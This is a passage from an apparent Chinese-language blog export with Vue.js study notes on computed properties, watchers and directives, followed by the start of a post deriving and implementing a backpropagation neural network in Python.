<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>原始字符串: &#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>计算后反转字符串: &#123;&#123; reversedMessage &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="comment">&lt;!--与method函数的形式上的区别是不用加()调用--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">message</span>: <span class="string">&#x27;Runoob!&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 计算属性的 getter</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">reversedMessage</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// `this` 指向 vm 实例</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">message</span>.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>watch</code>属性用于监听数据（也相当于函数），当数据改变时立即调用，使用如下：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">&quot;computed_props&quot;</span>&gt;</span></span><br><span class="line">   千米 : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;text&quot;</span> <span class="attr">v-model</span> = <span class="string">&quot;kilometers&quot;</span>&gt;</span></span><br><span class="line">   米 : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;text&quot;</span> <span class="attr">v-model</span> = <span class="string">&quot;meters&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;info&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">el</span>: <span class="string">&#x27;#computed_props&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">         kilometers : <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">         <span class="attr">meters</span>:<span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      computed :&#123;</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      watch : &#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="attr">kilometers</span>: <span class="keyword">function</span>(<span class="params">val</span>) &#123;                 &lt;!--函数名要与变量名相同--&gt;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">kilometers</span> = val;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">meters</span> = val * <span class="number">1000</span>;</span></span><br><span class="line"><span class="language-javascript">         &#125;,</span></span><br><span class="line"><span class="language-javascript">         <span class="attr">meters</span>: <span class="keyword">function</span> (<span class="params">val</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">kilometers</span> = val/ <span class="number">1000</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">meters</span> = val;</span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">   &#125;);</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// $watch 是一个实例方法</span></span></span><br><span class="line"><span class="language-javascript">  vm.$watch(<span class="string">&#x27;kilometers&#x27;</span>, <span class="keyword">function</span> (<span class="params">newValue, oldValue</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 这个回调将在 vm.kilometers 改变后调用</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">getElementById</span> (<span class="string">&quot;info&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;修改前值为: &quot;</span> + oldValue + <span class="string">&quot;，修改后值为: &quot;</span> + newValue;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>props</code>属性用于将父组件的值传递到子组件中。父组件中值的更新会传递到子组件中，但<strong>反过来则不行</strong>。因此，定义一个改变值的函数，应该把该函数写到父组件中。</li>
</ul>
<h3 id="（3）vuejs指令"><a href="#（3）vuejs指令" class="headerlink" title="（3）vuejs指令"></a>（3）vuejs指令</h3><ul>
<li><p>v-html指令，直接输出HTML语句到该元素的内容部分。</p>
</li>
<li><p>v-bind指令，用于约束标签的属性。如<code>&lt;a v-bind:href=&quot;url&quot;&gt;</code>，作用于href属性，可以让href等于自定义数据中的url变量。*v-bind指令的缩写<code>&lt;a :href=&quot;url&quot;&gt;</code>*。该标签的用处很大，如下：</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">block</span> <span class="attr">v-for</span>=<span class="string">&quot;(tab,index) in tabs&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- :id中把index参数赋给id；:class可以进行判断，单引号中是class名字 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">:id</span>=<span class="string">&quot;index&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;[activeIndex == index?&#x27;weui-bar__item_on&#x27;:&#x27;&#x27;,&#x27;weui-navbar__item&#x27;]&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;tabClick&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;weui-navbar__title&quot;</span>&gt;</span>&#123;&#123;tab&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>v-model指令，用于将输入数据传递到定义的数据变量。如<code>&lt;input v-model=&quot;message&quot;&gt;</code>将输入值传递到message变量。</p>
</li>
<li><p>v-on指令，用于监听事件并调用函数。如<code>&lt;button v-on:click=&quot;reverseMessage&quot;&gt;</code>，当点该button时，将调用reverseMessage函数。*v-on指令缩写<code>&lt;button @click=&quot;reverseMessage&quot;&gt;</code>*。</p>
</li>
<li><p>v-if、v-else、v-else-if指令按字面意思理解即可，使用如下：</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;type === &#x27;A&#x27;&quot;</span>&gt;</span></span><br><span class="line">  A</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">&quot;type === &#x27;B&#x27;&quot;</span>&gt;</span></span><br><span class="line">  B</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">&quot;type === &#x27;C&#x27;&quot;</span>&gt;</span></span><br><span class="line">  C</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">  Not A/B/C</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>v-show指令，效果与v-if指令相同。当v-show&#x3D;部分为真时，则显示该标签。</p>
</li>
<li><p>v-for指令，即for循环。其使用如下：</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;site in sites&quot;</span>&gt;</span>  <span class="comment">&lt;!--v-for中内容与Python类似，site可以换做其他名字--&gt;</span></span><br><span class="line">      &#123;&#123; site.name &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">sites</span>: [</span></span><br><span class="line"><span class="language-javascript">      &#123; <span class="attr">name</span>: <span class="string">&#x27;Runoob&#x27;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123; <span class="attr">name</span>: <span class="string">&#x27;Google&#x27;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123; <span class="attr">name</span>: <span class="string">&#x27;Taobao&#x27;</span> &#125;</span></span><br><span class="line"><span class="language-javascript">    ]</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- v-for除了迭代数组外，还可以迭代对象，key对应键、value对应值、index对应标号，可以只使用一个：value in object --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value, key, index) in object&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>  <span class="comment">&lt;!--官方建议，要给每一项一个key--&gt;</span></span><br><span class="line">     &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125; : &#123;&#123; value &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">object</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>: <span class="string">&#x27;菜鸟教程&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">url</span>: <span class="string">&#x27;http://www.runoob.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">slogan</span>: <span class="string">&#x27;学的不仅是技术，更是梦想！&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="（3）vue生命周期钩子函数"><a href="#（3）vue生命周期钩子函数" class="headerlink" title="（3）vue生命周期钩子函数"></a>（3）vue生命周期钩子函数</h3><h3 id="（4）控制元素class属性"><a href="#（4）控制元素class属性" class="headerlink" title="（4）控制元素class属性"></a>（4）控制元素class属性</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>vue js study<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.staticfile.org/vue/2.4.2/vue.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.redColor</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>class属性 动态绑定<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;redColor: changeColor&#125;&quot;</span>&gt;</span>&#123;&#123; hello &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeColor = !changeColor&quot;</span>&gt;</span>改变颜色<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">hello</span>: <span class="string">&#x27;hello world!&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">changeColor</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="4-后话"><a href="#4-后话" class="headerlink" title="4. 后话"></a>4. 后话</h2><p>此篇笔记是刚刚接触<code>vuejs</code>时所写，较急促，不完整。期望以后更深入的学习和更完善的笔记。</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>python实现BP神经网络</title>
    <url>/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>有幸，在软件可靠性课程的实验中，被要求实现BP神经网络模型。虽然，我觉得这门课程搭配这样的实验很无厘头，但正好趁这个机会，重新学习一下神经网络知识。学校的课程设计总归是不太令人满意的，但只要能学到有益的知识，就是赚到了。至于学分、绩点多少，就无关紧要了。</p>
<p>BP神经网络模型简介：</p>
<p>BP神经网络模型是1986年由Rumelhart和McClelland为首的科学家提出的概念，是一种按照误差逆向传播算法训练的多层前馈神经网络，是目前应用最广泛的神经网络。</p>
<span id="more"></span>

<h2 id="1-神经网络基本模型"><a href="#1-神经网络基本模型" class="headerlink" title="1. 神经网络基本模型"></a>1. 神经网络基本模型</h2><h3 id="1-1-单神经元模型"><a href="#1-1-单神经元模型" class="headerlink" title="1.1. 单神经元模型"></a>1.1. 单神经元模型</h3><p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/13.png" alt="1"></p>
<p>其中，<code>f(x)</code>函数为神经元输出经过的<strong>激活函数</strong>。</p>
<p>常见的激活函数有：</p>
<ul>
<li>sigmoid函数</li>
</ul>
<p>$$sigmoid(x) &#x3D; \frac{ 1 }{ 1+exp(-x) }$$</p>
<ul>
<li>sgn函数(阶跃函数)</li>
</ul>
<p>$$<br>sgn(x)&#x3D;\begin{cases}<br>1, &amp; x\geq0 \<br>0, &amp; x&lt;0 \<br>\end{cases}<br>$$</p>
<ul>
<li>ReLU(Rectified Linear Unit)函数</li>
</ul>
<p>$$<br>relu(x)&#x3D;\begin{cases}<br>x, &amp; x&gt;0 \<br>0, &amp; x\leq0 \<br>\end{cases}<br>$$</p>
<ul>
<li>……</li>
</ul>
<p>值得注意的是，激活函数大多为<strong>非线性函数</strong>。原因在于：</p>
<blockquote>
<p>线性函数的问题在于，不管如何加深层数，总是存在与之等效的“无隐藏层的神经网络”。为了具体地（稍微直观地）理解这一点，我们来思考下面这个简单的例子。这里我们考虑把线性函数 h(x) &#x3D; cx 作为激活函数，把y(x) &#x3D; h(h(h(x)))的运算对应3层神经网络A。这个运算会进行y(x) &#x3D; c × c × c × x的乘法运算，但是同样的处理可以由y(x) &#x3D; ax（注意，a &#x3D; c^3）这一次乘法运算（即没有隐藏层的神经网络）来表示。</p>
</blockquote>
<h3 id="1-2-多层神经网络"><a href="#1-2-多层神经网络" class="headerlink" title="1.2. 多层神经网络"></a>1.2. 多层神经网络</h3><p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/9.png" alt="9"></p>
<p>当神经网络有多层时，中间的层称为中间层或隐藏层。隐藏层的输入为上一层的输出，隐藏层的输出为下一层的输入，对隐藏层的输出同样需使用<strong>激活函数</strong>。输入层则一般不需要经过激活函数。</p>
<p>值得注意的是，一个神经元的输出会传递到下一层的<strong>每个</strong>神经元上。</p>
<h3 id="1-3-神经网络学习过程"><a href="#1-3-神经网络学习过程" class="headerlink" title="1.3. 神经网络学习过程"></a>1.3. 神经网络学习过程</h3><p>以感知机(由两层神经元组成)为例:</p>
<p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/14.png" alt="1"></p>
<p>对于训练样例$(X, y)$，其中$X&#x3D;{x_1, x_2}$，当前神经网络的输出为$\hat{y}$。假定输出层的激活函数为阶跃函数，其数学推导为：</p>
<p>$$\hat{y} &#x3D; f(w_1x_1 + w_2x_2 - \theta)$$</p>
<p>将实际值$y$与预测值$\hat{y}$进行数学比较，从而得出各权值$w_i$和阈值$\theta$的误差，从而更新相应的权值和阈值：</p>
<p>$$\Delta w_i &#x3D; \eta(y - \hat{y})x_i$$</p>
<p>$$w_i \leftarrow w_i + \Delta w_i$$</p>
<p>其中，$\eta \in (0,1)$，称为学习率。当$\hat{y}$与$y$相等，或者之差足够小时，则可认定为训练成功。</p>
<h2 id="2-BP误差反向传播算法"><a href="#2-BP误差反向传播算法" class="headerlink" title="2. BP误差反向传播算法"></a>2. BP误差反向传播算法</h2><h3 id="2-1-算法推导"><a href="#2-1-算法推导" class="headerlink" title="2.1. 算法推导"></a>2.1. 算法推导</h3><p>BP神经网络的数学推导过程相对简单，读者切不可望而却步。</p>
<p>更详细内容请参考西瓜书第5章——神经网络。</p>
<p>以三层神经网络为例：</p>
<p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/16.png" alt="1"></p>
<p><strong>注</strong>：输入层到隐藏层的阈值为$\gamma_h$，隐藏层到输出层的阈值为$\theta_j$，激活函数$f(x)$都为$Sigmoid$函数。</p>
<p>假定，对于一组样例$(X_k, Y_k)$，神经网络输入为$X_k &#x3D; (x_1^k, x_2^k,…, x_d^k)$，输出为$\hat{Y}_k &#x3D; (\hat{y}_1^k, \hat{y}_2^k,…, \hat{y}_l^k)$。</p>
<p>隐藏层输出为：</p>
<p>$$b_h &#x3D; f(\alpha_h - \gamma_h)$$</p>
<p>输出层输出为：</p>
<p>$$\hat{y}_j^k &#x3D; f(\beta_j - \theta_j)$$</p>
<p>那么，神经网络在<strong>当前样例$(X_k, Y_k)$上</strong>的<strong>均方误差</strong>为：</p>
<p>$$E_k &#x3D; \frac{1}{2}\sum_{j&#x3D;1}^l(\hat{y}_j^k-y_j^k)^2$$</p>
<p>根据均方误差结果，基于<strong>梯度下降</strong>策略，以目标的负梯度方向对隐层到输出层的权值参数$\Delta w_{hj}$进行调整。给定学习率，有：</p>
<p>$$\begin{aligned}<br>\Delta w_{hj} &amp;&#x3D; -\eta\frac{\partial E_k}{\partial w_{hj}} \<br>\end{aligned}$$</p>
<p>$$\begin{aligned}<br>\Delta w_{hj} &amp;&#x3D; -\eta\frac{\partial E_k}{\partial \hat{y}_j^k}\cdot\frac{\partial \hat{y}<em>j^k}{\partial \beta_j}\cdot\frac{\partial \beta_j}{\partial w</em>{hj}}<br>\end{aligned}$$</p>
<p>显然：</p>
<p>$$\frac{\partial E_k}{\partial \hat{y}_j^k} &#x3D; \hat{y}_j^k-y_j^k$$</p>
<p>根据图例中$\beta_j$的函数，又显然：</p>
<p>$$\frac{\partial \beta_j}{\partial w_{hj}} &#x3D; b_h$$</p>
<p>再根据$Sigmoid$函数的定义：</p>
<p>$$f^\prime(x) &#x3D; f(x)(1-f(x))$$</p>
<p>则：</p>
<p>$$\frac{\partial \hat{y}_j^k}{\partial \beta_j} &#x3D; \hat{y}_j^k(1-\hat{y}_j^k)$$</p>
<p>综上可得：</p>
<p>$$\Delta w_{hj} &#x3D; -\eta(\hat{y}_j^k-y_j^k)\hat{y}_j^k(1-\hat{y}_j^k)b_h$$</p>
<p>令：</p>
<p>$$g_j &#x3D; \hat{y}_j^k(y_j^k-\hat{y}_j^k)(1-\hat{y}_j^k)$$</p>
<p>最终：</p>
<p>$$\Delta w_{hj} &#x3D; \eta g_j b_h$$</p>
<p>进而，我们可以对隐藏层到输出层的阈值$\theta_j$进行调整：</p>
<p>$$\begin{aligned}<br>\Delta \theta_j &amp;&#x3D; -\eta\frac{\partial E_k}{\partial \theta_j} \<br>\Delta \theta_j &amp;&#x3D; -\eta\frac{\partial E_k}{\partial \hat{y}_j^k}\cdot\frac{\partial \hat{y}_j^k}{\partial \theta_j} \<br>\Delta \theta_j &amp;&#x3D; -\eta g_j<br>\end{aligned}$$</p>
<p>同理，我们可以得到输入层到隐藏层的权值和阈值误差为：</p>
<p>$$\begin{aligned}<br>\Delta v_{ih} &amp;&#x3D; \eta e_h x_i \<br>\Delta \gamma_j &amp;&#x3D; -\eta e_h<br>\end{aligned}$$</p>
<p>其中：</p>
<p>$$e_h &#x3D; b_h(1-b_h)\sum_{j&#x3D;1}^l w_{hj}g_j$$</p>
<h3 id="2-2-梯度下降的理解"><a href="#2-2-梯度下降的理解" class="headerlink" title="2.2. 梯度下降的理解"></a>2.2. 梯度下降的理解</h3><p>何为<a href="https://baike.baidu.com/item/%E6%A2%AF%E5%BA%A6/13014729?fr=aladdin">梯度？</a></p>
<p>首先，它是一个向量。</p>
<p>其次，它的定义为：设可微函数$f(x,y,z)$，对于函数上的某一个点$P(x,y,z)$，${\frac{\partial f}{\partial x}, \frac{\partial f}{\partial y}, \frac{\partial f}{\partial z}}$则是该函数在$P$点的梯度。</p>
<p>通俗来讲，函数某一点的梯度，就是该点的斜率，该点变化率最大的方向。而负梯度，则是该点能最快接近函数极小值的方向。</p>
<p>那么，何为<a href="https://baike.baidu.com/item/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D/4864937?fr=aladdin">梯度下降</a>呢？</p>
<p>梯度下降则是，沿当前点的负梯度方向变化：$x \leftarrow x - \gamma \nabla$，其中$\gamma$为步长。如果步长足够小，则可以保证每一次迭代都在减小，但可能导致收敛太慢；如果步长太大，则不能保证每一次迭代都减少，也不能保证收敛。</p>
<p>以函数$f(x) &#x3D; x^2$为例：</p>
<p>其梯度函数为$\nabla &#x3D; 2x$。</p>
<p>点$p(1,1)$处的梯度为$2$。</p>
<p>设步长为0.2，点$p$处进行梯度下降后，下一个点则为$(0.6, 0.64)$。</p>
<p>在BP神经网络中，采用梯度下降则是为了以最快速度调整参数，将误差降到极小(此处涉及到极小与最小的数学问题，有兴趣者可以看看西瓜书)。</p>
<h3 id="2-3-算法步骤"><a href="#2-3-算法步骤" class="headerlink" title="2.3. 算法步骤"></a>2.3. 算法步骤</h3><p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/17.png" alt="1"></p>
<h3 id="2-4-算法流程"><a href="#2-4-算法流程" class="headerlink" title="2.4. 算法流程"></a>2.4. 算法流程</h3><p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/18.png" alt="1"></p>
<h3 id="2-5-算法实现"><a href="#2-5-算法实现" class="headerlink" title="2.5. 算法实现"></a>2.5. 算法实现</h3><p>编写一个三层神经网络的<code>BP</code>类，在构造函数中初始化神经网络：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> tensorflow.examples.tutorials.mnist <span class="keyword">import</span> input_data</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">三层神经网络模型，包含：输入层、隐层、输出层</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BP</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    构造函数，初始化三层神网络的各参数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        x_count: 输入层神经元个数</span></span><br><span class="line"><span class="string">        mid_count: 隐层神经元个数</span></span><br><span class="line"><span class="string">        y_count: 输出层神经元个数</span></span><br><span class="line"><span class="string">        eta: 学习率</span></span><br><span class="line"><span class="string">        train_count: 最大训练次数</span></span><br><span class="line"><span class="string">        precision: 误差精度</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x_count, mid_count, 